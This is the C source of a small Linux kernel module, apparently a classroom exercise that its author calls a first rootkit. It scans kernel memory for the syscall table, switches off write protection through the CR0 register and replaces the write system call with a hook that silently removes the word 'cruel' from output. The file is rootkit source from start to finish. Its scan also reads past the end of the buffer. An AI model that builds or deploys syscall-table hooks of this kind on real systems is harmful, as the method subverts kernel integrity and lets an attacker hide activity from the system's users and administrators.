#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/system.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h> ///////

#define START_MEM   0xc0000000
#define END_MEM     0xd0000000

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CRA + clase");
MODULE_DESCRIPTION("My very first rookit oh how happy I am");

//extern void *ptr_sct[];
unsigned long *syscall_table = (unsigned long *)0xc12cbe90;
static int uid=1000;



asmlinkage size_t (*original_call) (int, char *, size_t);
unsigned long **find() {
 
    unsigned long **sctable;
    unsigned long int i = START_MEM;
 
    while ( i < END_MEM) {
 
        sctable = (unsigned long **)i;
 
        if ( sctable[__NR_close] == (unsigned long *) sys_close) {
 
            return &sctable[0];
 
        }
         
        i += sizeof(void *);
    }
 
    return NULL;
}
asmlinkage size_t our_sys_write(int descriptor,char *buff, size_t nbytes)
{
    int i=0;
   //
	while(i < nbytes){
		if((buff[i]   == 'c') && (buff[i+1] == 'r') && 
		   (buff[i+2] == 'u') && (buff[i+3] == 'e') && 
		   (buff[i+4] == 'l')) 
	   {
			 original_call(descriptor, buff , i);
			 original_call(descriptor,buff+i+5,nbytes-(i+5));
		     return nbytes;
	   }
		i++;
	}	
	return original_call(descriptor,(char*) buff, (size_t )nbytes);
}

int init_module()
{
	printk(KERN_ALERT "Esto es peligroso\n");
	syscall_table = (unsigned long *) find();
 
    	if ( syscall_table != NULL ) {
     	printk(KERN_ALERT "Direccion original: %p", (void * )syscall_table);
		write_cr0 (read_cr0 () & (~ 0x10000)); ///////
		original_call = (void *)syscall_table[__NR_write];
		syscall_table[__NR_write] = our_sys_write;
		write_cr0 (read_cr0 () | 0x10000); ///////

	}
	return 0;
}

void cleanup_module()
{
	printk(KERN_ALERT "Bule y nos vamos");

	write_cr0 (read_cr0 () & (~ 0x10000)); ///////
	syscall_table[__NR_write] = original_call;
	write_cr0 (read_cr0 () | 0x10000); ///////

	printk(KERN_ALERT "Aqui no paso nada");

}
